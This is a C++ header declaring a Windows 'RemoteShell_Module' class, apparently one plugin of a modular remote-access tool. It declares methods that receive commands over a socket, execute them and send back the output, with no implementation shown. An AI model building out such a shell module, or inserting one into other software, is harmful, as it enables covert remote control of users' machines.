#pragma once
#include "module.h"
#include <windows.h>
#include <string>
#include <atomic>
#include <thread>

class RemoteShell_Module : public Module {
public:
    RemoteShell_Module();
    ~RemoteShell_Module();
    
    const char* name() const override;
    void run() override;
    
    // Remote shell specific methods
    bool startRemoteShell(SOCKET sock);
    void stopRemoteShell();
    bool isShellActive() const;

private:
    std::atomic<bool> shellActive;
    std::thread shellThread;
    SOCKET clientSocket;
    
    void shellLoop(SOCKET sock);
    std::string executeCommand(const std::string& command);
    bool sendOutput(SOCKET sock, const std::string& output);
    bool receiveCommand(SOCKET sock, std::string& command);
};
